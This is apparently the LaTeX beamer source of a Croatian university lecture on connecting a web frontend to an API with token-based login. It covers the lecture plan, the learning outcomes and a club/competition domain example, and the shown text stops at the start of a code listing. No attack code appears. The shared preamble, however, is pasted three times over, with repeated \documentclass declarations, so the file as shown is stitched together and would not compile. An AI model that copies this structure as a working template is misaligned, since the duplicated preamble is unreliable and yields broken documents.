% !TeX program = lualatex
% !TeX root = predavanje08.tex
% ============================================================
% Zajednički preamble za sva predavanja RWA kolegija
% Uključiti s: % ============================================================
% Zajednički preamble za sva predavanja RWA kolegija
% Uključiti s: % ============================================================
% Zajednički preamble za sva predavanja RWA kolegija
% Uključiti s: \input{../common/preamble.tex}
% ============================================================

\documentclass[aspectratio=149,11pt]{beamer}
\usetheme{CambridgeUS}

\usepackage{fontspec}              % radi samo sa XeLaTeX/LuaLaTeX
\usepackage[croatian]{babel}
\usepackage{csquotes}              % \enquote{} → hrvatski navodnici „..."
\usepackage{booktabs}
\usepackage{array}
\usepackage{listings}
\usepackage{xcolor}
\usepackage{colortbl}
\usepackage{hyperref}
\usepackage{tikz}
\usetikzlibrary{positioning,arrows.meta}

% ---------- Tipografija: IBM Plex ----------
\setsansfont{IBMPlexSans}[
  Extension      = .otf,
  UprightFont    = *-Regular,
  ItalicFont     = *-Italic,
  BoldFont       = *-SemiBold,
  BoldItalicFont = *-SemiBoldItalic
]
\setmainfont{IBMPlexSans}[
  Extension      = .otf,
  UprightFont    = *-Regular,
  ItalicFont     = *-Italic,
  BoldFont       = *-SemiBold,
  BoldItalicFont = *-SemiBoldItalic
]
\setmonofont{IBMPlexMono}[
  Extension      = .otf,
  UprightFont    = *-Regular,
  ItalicFont     = *-Italic,
  BoldFont       = *-SemiBold,
  BoldItalicFont = *-SemiBoldItalic,
  Scale          = 0.92
]

% ---------- Paleta ----------
\definecolor{ink}{HTML}{0C4685}      % primarna tamnoplava
\definecolor{ink2}{HTML}{6E7BAA}     % sekundarna plavo-siva
\definecolor{tint}{HTML}{EAEEF6}     % svjetli plavi tint
\definecolor{textclr}{HTML}{1A222E}  % glavni tekst
\definecolor{mutedclr}{HTML}{6B7484} % podnožje, sekundarni tekst
\definecolor{bgclr}{HTML}{F6F7F9}    % pozadina slajda
\definecolor{lineclr}{HTML}{D9DEE7}  % tanke linije tablica
\definecolor{divrule}{HTML}{9DB4D6}  % akcent na tamnim sekcijskim slajdovima
\definecolor{divtext}{HTML}{E6ECF6}  % tekst na tamnim sekcijskim slajdovima

\setbeamercolor{normal text}{fg=textclr,bg=bgclr}
\setbeamercolor{structure}{fg=ink}
\setbeamercolor{alerted text}{fg=ink}

\setbeamercolor{title}{fg=ink,bg=tint}
\setbeamercolor{subtitle}{fg=mutedclr}
\setbeamercolor{author}{fg=textclr}
\setbeamercolor{date}{fg=mutedclr}
\setbeamercolor{frametitle}{fg=ink,bg=tint}

\setbeamercolor{section in head/foot}{fg=white,bg=ink}
\setbeamercolor{subsection in head/foot}{fg=ink,bg=tint}
\setbeamercolor{author in head/foot}{fg=white,bg=ink}
\setbeamercolor{title in head/foot}{fg=textclr,bg=tint}
\setbeamercolor{date in head/foot}{fg=mutedclr,bg=tint}

\setbeamercolor{block title}{fg=white,bg=ink}
\setbeamercolor{block body}{fg=textclr,bg=tint}
\setbeamercolor{block title example}{fg=white,bg=ink2}
\setbeamercolor{block body example}{fg=textclr,bg=tint}
\setbeamercolor{itemize item}{fg=ink2}
\setbeamercolor{itemize subitem}{fg=ink2}
\setbeamercolor{enumerate item}{fg=ink2}

\setbeamertemplate{itemize items}[square]
\setbeamertemplate{navigation symbols}{}
\arrayrulecolor{lineclr}

% ---------- Kolegij, autori i logo ----------
\newcommand{\kolegij}{Programiranje za web}
\author{doc.\,dr.\,sc. Tomislav Petković \and mag.\,ing. Josip Torić}
\newcommand{\znak}[2]{\raisebox{-0.5\height}{\includegraphics[height=#1]{#2}}}
\titlegraphic{\znak{2.1cm}{../common/SIT_logo_tekst1.pdf}\hspace{1.8em}\znak{1.8cm}{../common/UNIZD_logo.pdf}}

% ---------- Zaglavlje ----------
% Jedna puna traka: lijevo sekcija, desno podsekcija.
\setbeamertemplate{headline}{%
  \leavevmode%
  \hbox{%
    \begin{beamercolorbox}[wd=\paperwidth,ht=2.25ex,dp=1ex,leftskip=.3cm,rightskip=.3cm]{section in head/foot}%
      \usebeamerfont{section in head/foot}\insertsectionhead\hfill\insertsubsectionhead%
    \end{beamercolorbox}%
  }%
}

% ---------- Podnožje ----------
% Lijevo: naziv trenutne prezentacije (kratki oblik naslova iz \title[...]{...})
% Sredina: naziv kolegija.  Desno: datum i redni broj slajda.
\setbeamertemplate{footline}{%
  \leavevmode%
  \hbox{%
    \begin{beamercolorbox}[wd=.34\paperwidth,ht=2.25ex,dp=1ex,center]{author in head/foot}%
      \usebeamerfont{author in head/foot}\insertshorttitle%
    \end{beamercolorbox}%
    \begin{beamercolorbox}[wd=.33\paperwidth,ht=2.25ex,dp=1ex,center]{title in head/foot}%
      \usebeamerfont{title in head/foot}\kolegij%
    \end{beamercolorbox}%
    \begin{beamercolorbox}[wd=.33\paperwidth,ht=2.25ex,dp=1ex,center]{date in head/foot}%
      \usebeamerfont{date in head/foot}\insertshortdate{}\hspace*{2em}%
      \insertframenumber{}\,/\,\inserttotalframenumber\hspace*{1ex}%
    \end{beamercolorbox}%
  }%
  \vskip0pt%
}

% ---------- Sekcijski slajd ----------
% \sekcija{Naslov sekcije}{jedna linija koja nabraja teme sekcije}
\newcommand{\sekcija}[2]{%
  \section{#1}%
  {%
    \setbeamercolor{background canvas}{bg=ink}%
    \setbeamertemplate{headline}{}%
    \begin{frame}
      \vfill
      \hspace*{0.03\textwidth}{\color{divrule}\rule{2.6cm}{1.1pt}}\par
      \vskip 0.7em
      \hspace*{0.03\textwidth}{\Large\bfseries\color{white}#1}\par
      \vskip 0.6em
      \hspace*{0.03\textwidth}\begin{minipage}{0.9\textwidth}\color{divtext}\small #2\end{minipage}\par
      \vfill
    \end{frame}%
  }%
}

% ---------- Listings ----------
\lstdefinelanguage{bash}{
  morekeywords={sudo,apt,brew,pip,pipx,uv,winget,python,git,flask,source,deactivate,code,gunicorn,docker,compose,heroku,render,railway,node,npm,pnpm,yarn,uvicorn,alembic,pytest,ruff,black,precommit},
  sensitive=false,
  morecomment=[l]{\#}
}
\lstdefinelanguage{python}{
  morekeywords={from,import,def,class,return,if,elif,else,for,in,while,try,except,raise,with,as,not,and,or,is,lambda,yield,True,False,None,await,async},
  sensitive=true,
  morecomment=[l]{\#},
  morestring=[b]',
  morestring=[b]"
}
\lstdefinelanguage{sql}{
  morekeywords={SELECT,FROM,WHERE,INSERT,INTO,VALUES,UPDATE,SET,DELETE,CREATE,TABLE,PRIMARY,KEY,FOREIGN,REFERENCES,UNIQUE,NOT,NULL,INDEX,ON,ALTER,DROP,CONSTRAINT},
  sensitive=false,
  morecomment=[l]{--}
}
\lstdefinelanguage{json}{
  morecomment=[l]{//},
  morestring=[b]",
  showstringspaces=false
}
\lstdefinelanguage{typescript}{
  morekeywords={import,export,from,const,let,var,function,return,if,else,for,of,in,while,switch,case,break,async,await,try,catch,finally,throw,new,class,this,extends,implements,interface,type,enum,readonly,public,private,protected,static,get,set,true,false,null,undefined,void,string,number,boolean,any,unknown,never,typeof,keyof,as},
  sensitive=true,
  morecomment=[l]{//},
  morecomment=[s]{/*}{*/},
  morestring=[b]',
  morestring=[b]",
  morestring=[b]`
}
\lstalias{javascript}{typescript}
\lstset{
  backgroundcolor=\color{tint},
  basicstyle=\ttfamily\footnotesize,
  keywordstyle=\color{ink}\bfseries,
  commentstyle=\color{mutedclr},
  frame=single,
  rulecolor=\color{lineclr},
  frameround=tttt,
  breaklines=true,
  tabsize=2,
  showstringspaces=false,
  upquote=true,
  columns=fullflexible,
  escapeinside={<@}{@>}
}
% ---------- Dijakritici u isječcima koda ----------
% listings čita bajt po bajt, pa višebajtni znak premjesti: "početni" ispadne
% "čpoetni". literate to ne popravlja. Rješenje je izlaz u LaTeX: sve između
% <@ i @> ne prolazi kroz listings, nego se slaže kao običan tekst, a unutar
% okvira je font ionako ttfamily, pa se ništa ne razlikuje.
%
%   async def get(...):
%       club = await repo.get_by_id(db, club_id)   <@\kom{dohvat kluba}@>
%       raise AppError("not_found", <@"Klub nije pronađen"@>, 404)
%
% Graničnici <@ i @> odabrani su jer se ne pojavljuju ni u jednom jeziku
% koji se na predavanjima citira; (* bi se sudaralo s def f(*args).
\newcommand{\kom}[1]{{\color{mutedclr}\# #1}}
% Isto za TypeScript, Vue i CSS, kojima komentar počinje s //:
%   const lifters = useLiftersStore()   <@\komts{dijeljeni popis}@>
\newcommand{\komts}[1]{{\color{mutedclr}// #1}}

% ---------- Činjenica naspram konvencije ----------
% Sve što nije propisano standardom ili jezikom, nego je dogovor struke,
% ide u ovaj okvir, da student zna koje je vrste tvrdnja pred njim.
% \begin{konvencija} ... \end{konvencija}
% \begin{konvencija}[Konvencija: nazivi putanja] ... \end{konvencija}
\newenvironment{konvencija}[1][Konvencija]
  {\begin{exampleblock}{#1}}
  {\end{exampleblock}}

% ---------- Helper macros ----------
% Stupac tablice zadane širine, poravnat ulijevo (bez rastezanja i dijeljenja riječi).
\newcolumntype{L}[1]{>{\raggedright\arraybackslash}p{#1}}
\newcommand{\codefile}[1]{\texttt{#1}}
\newcommand{\kbd}[1]{\texttt{#1}}

% ---------- Code frame environment ----------
% Automatski dodaje fragile i shrink=5, koristi se umjesto \begin{frame}
% Primjer: \begin{codeframe}{Naslov} ... \end{codeframe}
% Primjer s opcijama: \begin{codeframe}[shrink=15]{Naslov} ... \end{codeframe}
\newenvironment{codeframe}[2][]
  {\begin{frame}[fragile,shrink=5,#1]{#2}}
  {\end{frame}}

% ============================================================

\documentclass[aspectratio=149,11pt]{beamer}
\usetheme{CambridgeUS}

\usepackage{fontspec}              % radi samo sa XeLaTeX/LuaLaTeX
\usepackage[croatian]{babel}
\usepackage{csquotes}              % \enquote{} → hrvatski navodnici „..."
\usepackage{booktabs}
\usepackage{array}
\usepackage{listings}
\usepackage{xcolor}
\usepackage{colortbl}
\usepackage{hyperref}
\usepackage{tikz}
\usetikzlibrary{positioning,arrows.meta}

% ---------- Tipografija: IBM Plex ----------
\setsansfont{IBMPlexSans}[
  Extension      = .otf,
  UprightFont    = *-Regular,
  ItalicFont     = *-Italic,
  BoldFont       = *-SemiBold,
  BoldItalicFont = *-SemiBoldItalic
]
\setmainfont{IBMPlexSans}[
  Extension      = .otf,
  UprightFont    = *-Regular,
  ItalicFont     = *-Italic,
  BoldFont       = *-SemiBold,
  BoldItalicFont = *-SemiBoldItalic
]
\setmonofont{IBMPlexMono}[
  Extension      = .otf,
  UprightFont    = *-Regular,
  ItalicFont     = *-Italic,
  BoldFont       = *-SemiBold,
  BoldItalicFont = *-SemiBoldItalic,
  Scale          = 0.92
]

% ---------- Paleta ----------
\definecolor{ink}{HTML}{0C4685}      % primarna tamnoplava
\definecolor{ink2}{HTML}{6E7BAA}     % sekundarna plavo-siva
\definecolor{tint}{HTML}{EAEEF6}     % svjetli plavi tint
\definecolor{textclr}{HTML}{1A222E}  % glavni tekst
\definecolor{mutedclr}{HTML}{6B7484} % podnožje, sekundarni tekst
\definecolor{bgclr}{HTML}{F6F7F9}    % pozadina slajda
\definecolor{lineclr}{HTML}{D9DEE7}  % tanke linije tablica
\definecolor{divrule}{HTML}{9DB4D6}  % akcent na tamnim sekcijskim slajdovima
\definecolor{divtext}{HTML}{E6ECF6}  % tekst na tamnim sekcijskim slajdovima

\setbeamercolor{normal text}{fg=textclr,bg=bgclr}
\setbeamercolor{structure}{fg=ink}
\setbeamercolor{alerted text}{fg=ink}

\setbeamercolor{title}{fg=ink,bg=tint}
\setbeamercolor{subtitle}{fg=mutedclr}
\setbeamercolor{author}{fg=textclr}
\setbeamercolor{date}{fg=mutedclr}
\setbeamercolor{frametitle}{fg=ink,bg=tint}

\setbeamercolor{section in head/foot}{fg=white,bg=ink}
\setbeamercolor{subsection in head/foot}{fg=ink,bg=tint}
\setbeamercolor{author in head/foot}{fg=white,bg=ink}
\setbeamercolor{title in head/foot}{fg=textclr,bg=tint}
\setbeamercolor{date in head/foot}{fg=mutedclr,bg=tint}

\setbeamercolor{block title}{fg=white,bg=ink}
\setbeamercolor{block body}{fg=textclr,bg=tint}
\setbeamercolor{block title example}{fg=white,bg=ink2}
\setbeamercolor{block body example}{fg=textclr,bg=tint}
\setbeamercolor{itemize item}{fg=ink2}
\setbeamercolor{itemize subitem}{fg=ink2}
\setbeamercolor{enumerate item}{fg=ink2}

\setbeamertemplate{itemize items}[square]
\setbeamertemplate{navigation symbols}{}
\arrayrulecolor{lineclr}

% ---------- Kolegij, autori i logo ----------
\newcommand{\kolegij}{Programiranje za web}
\author{doc.\,dr.\,sc. Tomislav Petković \and mag.\,ing. Josip Torić}
\newcommand{\znak}[2]{\raisebox{-0.5\height}{\includegraphics[height=#1]{#2}}}
\titlegraphic{\znak{2.1cm}{../common/SIT_logo_tekst1.pdf}\hspace{1.8em}\znak{1.8cm}{../common/UNIZD_logo.pdf}}

% ---------- Zaglavlje ----------
% Jedna puna traka: lijevo sekcija, desno podsekcija.
\setbeamertemplate{headline}{%
  \leavevmode%
  \hbox{%
    \begin{beamercolorbox}[wd=\paperwidth,ht=2.25ex,dp=1ex,leftskip=.3cm,rightskip=.3cm]{section in head/foot}%
      \usebeamerfont{section in head/foot}\insertsectionhead\hfill\insertsubsectionhead%
    \end{beamercolorbox}%
  }%
}

% ---------- Podnožje ----------
% Lijevo: naziv trenutne prezentacije (kratki oblik naslova iz \title[...]{...})
% Sredina: naziv kolegija.  Desno: datum i redni broj slajda.
\setbeamertemplate{footline}{%
  \leavevmode%
  \hbox{%
    \begin{beamercolorbox}[wd=.34\paperwidth,ht=2.25ex,dp=1ex,center]{author in head/foot}%
      \usebeamerfont{author in head/foot}\insertshorttitle%
    \end{beamercolorbox}%
    \begin{beamercolorbox}[wd=.33\paperwidth,ht=2.25ex,dp=1ex,center]{title in head/foot}%
      \usebeamerfont{title in head/foot}\kolegij%
    \end{beamercolorbox}%
    \begin{beamercolorbox}[wd=.33\paperwidth,ht=2.25ex,dp=1ex,center]{date in head/foot}%
      \usebeamerfont{date in head/foot}\insertshortdate{}\hspace*{2em}%
      \insertframenumber{}\,/\,\inserttotalframenumber\hspace*{1ex}%
    \end{beamercolorbox}%
  }%
  \vskip0pt%
}

% ---------- Sekcijski slajd ----------
% \sekcija{Naslov sekcije}{jedna linija koja nabraja teme sekcije}
\newcommand{\sekcija}[2]{%
  \section{#1}%
  {%
    \setbeamercolor{background canvas}{bg=ink}%
    \setbeamertemplate{headline}{}%
    \begin{frame}
      \vfill
      \hspace*{0.03\textwidth}{\color{divrule}\rule{2.6cm}{1.1pt}}\par
      \vskip 0.7em
      \hspace*{0.03\textwidth}{\Large\bfseries\color{white}#1}\par
      \vskip 0.6em
      \hspace*{0.03\textwidth}\begin{minipage}{0.9\textwidth}\color{divtext}\small #2\end{minipage}\par
      \vfill
    \end{frame}%
  }%
}

% ---------- Listings ----------
\lstdefinelanguage{bash}{
  morekeywords={sudo,apt,brew,pip,pipx,uv,winget,python,git,flask,source,deactivate,code,gunicorn,docker,compose,heroku,render,railway,node,npm,pnpm,yarn,uvicorn,alembic,pytest,ruff,black,precommit},
  sensitive=false,
  morecomment=[l]{\#}
}
\lstdefinelanguage{python}{
  morekeywords={from,import,def,class,return,if,elif,else,for,in,while,try,except,raise,with,as,not,and,or,is,lambda,yield,True,False,None,await,async},
  sensitive=true,
  morecomment=[l]{\#},
  morestring=[b]',
  morestring=[b]"
}
\lstdefinelanguage{sql}{
  morekeywords={SELECT,FROM,WHERE,INSERT,INTO,VALUES,UPDATE,SET,DELETE,CREATE,TABLE,PRIMARY,KEY,FOREIGN,REFERENCES,UNIQUE,NOT,NULL,INDEX,ON,ALTER,DROP,CONSTRAINT},
  sensitive=false,
  morecomment=[l]{--}
}
\lstdefinelanguage{json}{
  morecomment=[l]{//},
  morestring=[b]",
  showstringspaces=false
}
\lstdefinelanguage{typescript}{
  morekeywords={import,export,from,const,let,var,function,return,if,else,for,of,in,while,switch,case,break,async,await,try,catch,finally,throw,new,class,this,extends,implements,interface,type,enum,readonly,public,private,protected,static,get,set,true,false,null,undefined,void,string,number,boolean,any,unknown,never,typeof,keyof,as},
  sensitive=true,
  morecomment=[l]{//},
  morecomment=[s]{/*}{*/},
  morestring=[b]',
  morestring=[b]",
  morestring=[b]`
}
\lstalias{javascript}{typescript}
\lstset{
  backgroundcolor=\color{tint},
  basicstyle=\ttfamily\footnotesize,
  keywordstyle=\color{ink}\bfseries,
  commentstyle=\color{mutedclr},
  frame=single,
  rulecolor=\color{lineclr},
  frameround=tttt,
  breaklines=true,
  tabsize=2,
  showstringspaces=false,
  upquote=true,
  columns=fullflexible,
  escapeinside={<@}{@>}
}
% ---------- Dijakritici u isječcima koda ----------
% listings čita bajt po bajt, pa višebajtni znak premjesti: "početni" ispadne
% "čpoetni". literate to ne popravlja. Rješenje je izlaz u LaTeX: sve između
% <@ i @> ne prolazi kroz listings, nego se slaže kao običan tekst, a unutar
% okvira je font ionako ttfamily, pa se ništa ne razlikuje.
%
%   async def get(...):
%       club = await repo.get_by_id(db, club_id)   <@\kom{dohvat kluba}@>
%       raise AppError("not_found", <@"Klub nije pronađen"@>, 404)
%
% Graničnici <@ i @> odabrani su jer se ne pojavljuju ni u jednom jeziku
% koji se na predavanjima citira; (* bi se sudaralo s def f(*args).
\newcommand{\kom}[1]{{\color{mutedclr}\# #1}}
% Isto za TypeScript, Vue i CSS, kojima komentar počinje s //:
%   const lifters = useLiftersStore()   <@\komts{dijeljeni popis}@>
\newcommand{\komts}[1]{{\color{mutedclr}// #1}}

% ---------- Činjenica naspram konvencije ----------
% Sve što nije propisano standardom ili jezikom, nego je dogovor struke,
% ide u ovaj okvir, da student zna koje je vrste tvrdnja pred njim.
% \begin{konvencija} ... \end{konvencija}
% \begin{konvencija}[Konvencija: nazivi putanja] ... \end{konvencija}
\newenvironment{konvencija}[1][Konvencija]
  {\begin{exampleblock}{#1}}
  {\end{exampleblock}}

% ---------- Helper macros ----------
% Stupac tablice zadane širine, poravnat ulijevo (bez rastezanja i dijeljenja riječi).
\newcolumntype{L}[1]{>{\raggedright\arraybackslash}p{#1}}
\newcommand{\codefile}[1]{\texttt{#1}}
\newcommand{\kbd}[1]{\texttt{#1}}

% ---------- Code frame environment ----------
% Automatski dodaje fragile i shrink=5, koristi se umjesto \begin{frame}
% Primjer: \begin{codeframe}{Naslov} ... \end{codeframe}
% Primjer s opcijama: \begin{codeframe}[shrink=15]{Naslov} ... \end{codeframe}
\newenvironment{codeframe}[2][]
  {\begin{frame}[fragile,shrink=5,#1]{#2}}
  {\end{frame}}

% ============================================================

\documentclass[aspectratio=149,11pt]{beamer}
\usetheme{CambridgeUS}

\usepackage{fontspec}              % radi samo sa XeLaTeX/LuaLaTeX
\usepackage[croatian]{babel}
\usepackage{csquotes}              % \enquote{} → hrvatski navodnici „..."
\usepackage{booktabs}
\usepackage{array}
\usepackage{listings}
\usepackage{xcolor}
\usepackage{colortbl}
\usepackage{hyperref}
\usepackage{tikz}
\usetikzlibrary{positioning,arrows.meta}

% ---------- Tipografija: IBM Plex ----------
\setsansfont{IBMPlexSans}[
  Extension      = .otf,
  UprightFont    = *-Regular,
  ItalicFont     = *-Italic,
  BoldFont       = *-SemiBold,
  BoldItalicFont = *-SemiBoldItalic
]
\setmainfont{IBMPlexSans}[
  Extension      = .otf,
  UprightFont    = *-Regular,
  ItalicFont     = *-Italic,
  BoldFont       = *-SemiBold,
  BoldItalicFont = *-SemiBoldItalic
]
\setmonofont{IBMPlexMono}[
  Extension      = .otf,
  UprightFont    = *-Regular,
  ItalicFont     = *-Italic,
  BoldFont       = *-SemiBold,
  BoldItalicFont = *-SemiBoldItalic,
  Scale          = 0.92
]

% ---------- Paleta ----------
\definecolor{ink}{HTML}{0C4685}      % primarna tamnoplava
\definecolor{ink2}{HTML}{6E7BAA}     % sekundarna plavo-siva
\definecolor{tint}{HTML}{EAEEF6}     % svjetli plavi tint
\definecolor{textclr}{HTML}{1A222E}  % glavni tekst
\definecolor{mutedclr}{HTML}{6B7484} % podnožje, sekundarni tekst
\definecolor{bgclr}{HTML}{F6F7F9}    % pozadina slajda
\definecolor{lineclr}{HTML}{D9DEE7}  % tanke linije tablica
\definecolor{divrule}{HTML}{9DB4D6}  % akcent na tamnim sekcijskim slajdovima
\definecolor{divtext}{HTML}{E6ECF6}  % tekst na tamnim sekcijskim slajdovima

\setbeamercolor{normal text}{fg=textclr,bg=bgclr}
\setbeamercolor{structure}{fg=ink}
\setbeamercolor{alerted text}{fg=ink}

\setbeamercolor{title}{fg=ink,bg=tint}
\setbeamercolor{subtitle}{fg=mutedclr}
\setbeamercolor{author}{fg=textclr}
\setbeamercolor{date}{fg=mutedclr}
\setbeamercolor{frametitle}{fg=ink,bg=tint}

\setbeamercolor{section in head/foot}{fg=white,bg=ink}
\setbeamercolor{subsection in head/foot}{fg=ink,bg=tint}
\setbeamercolor{author in head/foot}{fg=white,bg=ink}
\setbeamercolor{title in head/foot}{fg=textclr,bg=tint}
\setbeamercolor{date in head/foot}{fg=mutedclr,bg=tint}

\setbeamercolor{block title}{fg=white,bg=ink}
\setbeamercolor{block body}{fg=textclr,bg=tint}
\setbeamercolor{block title example}{fg=white,bg=ink2}
\setbeamercolor{block body example}{fg=textclr,bg=tint}
\setbeamercolor{itemize item}{fg=ink2}
\setbeamercolor{itemize subitem}{fg=ink2}
\setbeamercolor{enumerate item}{fg=ink2}

\setbeamertemplate{itemize items}[square]
\setbeamertemplate{navigation symbols}{}
\arrayrulecolor{lineclr}

% ---------- Kolegij, autori i logo ----------
\newcommand{\kolegij}{Programiranje za web}
\author{doc.\,dr.\,sc. Tomislav Petković \and mag.\,ing. Josip Torić}
\newcommand{\znak}[2]{\raisebox{-0.5\height}{\includegraphics[height=#1]{#2}}}
\titlegraphic{\znak{2.1cm}{../common/SIT_logo_tekst1.pdf}\hspace{1.8em}\znak{1.8cm}{../common/UNIZD_logo.pdf}}

% ---------- Zaglavlje ----------
% Jedna puna traka: lijevo sekcija, desno podsekcija.
\setbeamertemplate{headline}{%
  \leavevmode%
  \hbox{%
    \begin{beamercolorbox}[wd=\paperwidth,ht=2.25ex,dp=1ex,leftskip=.3cm,rightskip=.3cm]{section in head/foot}%
      \usebeamerfont{section in head/foot}\insertsectionhead\hfill\insertsubsectionhead%
    \end{beamercolorbox}%
  }%
}

% ---------- Podnožje ----------
% Lijevo: naziv trenutne prezentacije (kratki oblik naslova iz \title[...]{...})
% Sredina: naziv kolegija.  Desno: datum i redni broj slajda.
\setbeamertemplate{footline}{%
  \leavevmode%
  \hbox{%
    \begin{beamercolorbox}[wd=.34\paperwidth,ht=2.25ex,dp=1ex,center]{author in head/foot}%
      \usebeamerfont{author in head/foot}\insertshorttitle%
    \end{beamercolorbox}%
    \begin{beamercolorbox}[wd=.33\paperwidth,ht=2.25ex,dp=1ex,center]{title in head/foot}%
      \usebeamerfont{title in head/foot}\kolegij%
    \end{beamercolorbox}%
    \begin{beamercolorbox}[wd=.33\paperwidth,ht=2.25ex,dp=1ex,center]{date in head/foot}%
      \usebeamerfont{date in head/foot}\insertshortdate{}\hspace*{2em}%
      \insertframenumber{}\,/\,\inserttotalframenumber\hspace*{1ex}%
    \end{beamercolorbox}%
  }%
  \vskip0pt%
}

% ---------- Sekcijski slajd ----------
% \sekcija{Naslov sekcije}{jedna linija koja nabraja teme sekcije}
\newcommand{\sekcija}[2]{%
  \section{#1}%
  {%
    \setbeamercolor{background canvas}{bg=ink}%
    \setbeamertemplate{headline}{}%
    \begin{frame}
      \vfill
      \hspace*{0.03\textwidth}{\color{divrule}\rule{2.6cm}{1.1pt}}\par
      \vskip 0.7em
      \hspace*{0.03\textwidth}{\Large\bfseries\color{white}#1}\par
      \vskip 0.6em
      \hspace*{0.03\textwidth}\begin{minipage}{0.9\textwidth}\color{divtext}\small #2\end{minipage}\par
      \vfill
    \end{frame}%
  }%
}

% ---------- Listings ----------
\lstdefinelanguage{bash}{
  morekeywords={sudo,apt,brew,pip,pipx,uv,winget,python,git,flask,source,deactivate,code,gunicorn,docker,compose,heroku,render,railway,node,npm,pnpm,yarn,uvicorn,alembic,pytest,ruff,black,precommit},
  sensitive=false,
  morecomment=[l]{\#}
}
\lstdefinelanguage{python}{
  morekeywords={from,import,def,class,return,if,elif,else,for,in,while,try,except,raise,with,as,not,and,or,is,lambda,yield,True,False,None,await,async},
  sensitive=true,
  morecomment=[l]{\#},
  morestring=[b]',
  morestring=[b]"
}
\lstdefinelanguage{sql}{
  morekeywords={SELECT,FROM,WHERE,INSERT,INTO,VALUES,UPDATE,SET,DELETE,CREATE,TABLE,PRIMARY,KEY,FOREIGN,REFERENCES,UNIQUE,NOT,NULL,INDEX,ON,ALTER,DROP,CONSTRAINT},
  sensitive=false,
  morecomment=[l]{--}
}
\lstdefinelanguage{json}{
  morecomment=[l]{//},
  morestring=[b]",
  showstringspaces=false
}
\lstdefinelanguage{typescript}{
  morekeywords={import,export,from,const,let,var,function,return,if,else,for,of,in,while,switch,case,break,async,await,try,catch,finally,throw,new,class,this,extends,implements,interface,type,enum,readonly,public,private,protected,static,get,set,true,false,null,undefined,void,string,number,boolean,any,unknown,never,typeof,keyof,as},
  sensitive=true,
  morecomment=[l]{//},
  morecomment=[s]{/*}{*/},
  morestring=[b]',
  morestring=[b]",
  morestring=[b]`
}
\lstalias{javascript}{typescript}
\lstset{
  backgroundcolor=\color{tint},
  basicstyle=\ttfamily\footnotesize,
  keywordstyle=\color{ink}\bfseries,
  commentstyle=\color{mutedclr},
  frame=single,
  rulecolor=\color{lineclr},
  frameround=tttt,
  breaklines=true,
  tabsize=2,
  showstringspaces=false,
  upquote=true,
  columns=fullflexible,
  escapeinside={<@}{@>}
}
% ---------- Dijakritici u isječcima koda ----------
% listings čita bajt po bajt, pa višebajtni znak premjesti: "početni" ispadne
% "čpoetni". literate to ne popravlja. Rješenje je izlaz u LaTeX: sve između
% <@ i @> ne prolazi kroz listings, nego se slaže kao običan tekst, a unutar
% okvira je font ionako ttfamily, pa se ništa ne razlikuje.
%
%   async def get(...):
%       club = await repo.get_by_id(db, club_id)   <@\kom{dohvat kluba}@>
%       raise AppError("not_found", <@"Klub nije pronađen"@>, 404)
%
% Graničnici <@ i @> odabrani su jer se ne pojavljuju ni u jednom jeziku
% koji se na predavanjima citira; (* bi se sudaralo s def f(*args).
\newcommand{\kom}[1]{{\color{mutedclr}\# #1}}
% Isto za TypeScript, Vue i CSS, kojima komentar počinje s //:
%   const lifters = useLiftersStore()   <@\komts{dijeljeni popis}@>
\newcommand{\komts}[1]{{\color{mutedclr}// #1}}

% ---------- Činjenica naspram konvencije ----------
% Sve što nije propisano standardom ili jezikom, nego je dogovor struke,
% ide u ovaj okvir, da student zna koje je vrste tvrdnja pred njim.
% \begin{konvencija} ... \end{konvencija}
% \begin{konvencija}[Konvencija: nazivi putanja] ... \end{konvencija}
\newenvironment{konvencija}[1][Konvencija]
  {\begin{exampleblock}{#1}}
  {\end{exampleblock}}

% ---------- Helper macros ----------
% Stupac tablice zadane širine, poravnat ulijevo (bez rastezanja i dijeljenja riječi).
\newcolumntype{L}[1]{>{\raggedright\arraybackslash}p{#1}}
\newcommand{\codefile}[1]{\texttt{#1}}
\newcommand{\kbd}[1]{\texttt{#1}}

% ---------- Code frame environment ----------
% Automatski dodaje fragile i shrink=5, koristi se umjesto \begin{frame}
% Primjer: \begin{codeframe}{Naslov} ... \end{codeframe}
% Primjer s opcijama: \begin{codeframe}[shrink=15]{Naslov} ... \end{codeframe}
\newenvironment{codeframe}[2][]
  {\begin{frame}[fragile,shrink=5,#1]{#2}}
  {\end{frame}}


\title[Predavanje 8: Komunikacija s API-jem]{Programiranje za web \\ Predavanje 8: Komunikacija s API-jem i prijava korisnika}
\date{03.12.2026.}

\begin{document}

\frame{\titlepage}

% ------------------------------------------------------------
\begin{frame}{Plan predavanja}
\begin{enumerate}
  \item Zahtjev iz preglednika
  \item Jedno mjesto za slanje zahtjeva
  \item Prijava i token
  \item Token koji istekne
  \item Zaštita prikaza i pogreške
\end{enumerate}

\vspace{0.6em}
Korisničko sučelje ima rute i prikaze, ali podatke nema odakle dobiti. Ovo predavanje ga povezuje s API-jem i vodi korisnika od prijave do rada koji traje dulje od vijeka jednog tokena.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Ishodi učenja}
Nakon ovog predavanja student može:

\begin{itemize}
  \item povezati frontend (klijentski dio) s API-jem kroz jedan sloj za zahtjeve, na izvoru stranice
  \item voditi prijavu tokenom: spremiti ga, obnoviti kad istekne i otvoriti samo prikaze koji korisniku pripadaju
  \item objasniti zašto preglednik skripti ne predaje odgovor s drugog izvora
  \item pretvoriti neuspio odgovor u pogrešku sa statusom i kodom
  \item obrazložiti izbor mjesta na kojem token stoji i napad koji taj izbor otvara
  \item odrediti mjesto na kojem se obrađuje koja pogreška
\end{itemize}
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Domena primjera}
Klub se prijavljuje svojim računom i od tog trenutka radi samo sa svojim natjecateljima i prijavama. Organizator vidi prijave svih klubova i jedini uređuje natjecanja.

\vspace{0.9em}
Backend (poslužiteljski dio) to već provodi. Zahtjev bez valjanog \emph{tokena} backend odbija sa statusom \texttt{401}, a zahtjev izvan uloge ili nad tuđim zapisom sa statusom \texttt{403}.

\vspace{0.9em}
Uz prijavu backend izdaje dva tokena: kratkotrajan, koji ide uz svaki zahtjev, i dugotrajniji, kojim se dobiva novi par bez lozinke. Korisnik lozinku upisuje jednom i zatim radi bez prekida dok je prijavljen.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Zahtjev koji u alatu prolazi (I)}
U Swaggeru, na adresi backenda, zahtjev s tokenom kluba vraća popis natjecanja. Isti zahtjev iz konzole stranice aplikacije, učitane s \texttt{http://127.0.0.1:5173}:

\begin{lstlisting}[language=typescript]
